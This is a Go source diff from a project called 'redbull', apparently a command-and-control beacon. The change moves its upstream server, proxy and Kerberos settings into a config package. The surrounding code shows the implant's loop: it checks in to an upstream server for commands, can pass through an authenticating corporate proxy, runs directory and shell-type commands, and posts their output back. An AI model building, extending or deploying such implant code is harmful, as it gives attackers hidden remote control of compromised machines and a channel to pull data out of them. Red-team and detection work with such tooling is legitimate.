@@ -9,6 +9,7 @@ import (
 	"os/exec"
 	"os/signal"
 	"path"
+	config "redbull"
 	"strings"
 	"syscall"
 	"time"
@@ -17,9 +18,6 @@ import (
 	"redbull/internal/rbkrb"
 )
 
-var UPSTREAM = "http://localhost:8000"
-var PROXY_URL = "http://PROXY_HERE:8080"
-var USE_KRB = true
 var SLEEP_TIME = 1 * time.Second
 var CWD = ""
 
@@ -46,7 +44,7 @@ func getCwd(_ string) (string, string, error) {
 }
 
 func getBeaconStatus(_ string) (string, string, error) {
-	return fmt.Sprintf("Upstream: %s\nProxy: %s\nUsing KRB: %t\nSleep Time: %s", UPSTREAM, PROXY_URL, USE_KRB, SLEEP_TIME), "", nil
+	return fmt.Sprintf("Upstream: %s\nProxy: %s\nUsing KRB: %t\nSleep Time: %s", config.UPSTREAM, config.PROXY_URL, config.USE_KRB, SLEEP_TIME), "", nil
 }
 
 func changeDirectory(command string) (string, string, error) {
@@ -121,8 +119,8 @@ func main() {
 	signal.Notify(termSig, syscall.SIGINT, syscall.SIGTERM)
 
 	var httpClient rbhttp.HttpClient
-	if USE_KRB {
-		httpClient = rbkrb.NewKrbCurlHttpClient(PROXY_URL)
+	if config.USE_KRB {
+		httpClient = rbkrb.NewKrbCurlHttpClient(config.PROXY_URL)
 	} else {
 		httpClient = rbhttp.NewSimpleHttpClient()
 	}
@@ -134,7 +132,7 @@ func main() {
 		default:
 			time.Sleep(SLEEP_TIME)
 
-			resp, err := rbhttp.Get[rbhttp.CheckInResponse](httpClient, UPSTREAM)
+			resp, err := rbhttp.Get[rbhttp.CheckInResponse](httpClient, config.UPSTREAM)
 			if err != nil {
 				continue
 			}
@@ -165,7 +163,7 @@ func sendResult(httpClient rbhttp.HttpClient, command, stdout, stderr string) {
 		CurrentDirectory: CWD,
 	}
 
-	_, err := rbhttp.Post[any](httpClient, UPSTREAM, result)
+	_, err := rbhttp.Post[any](httpClient, config.UPSTREAM, result)
 	if err != nil {
 		_ = err
 	}
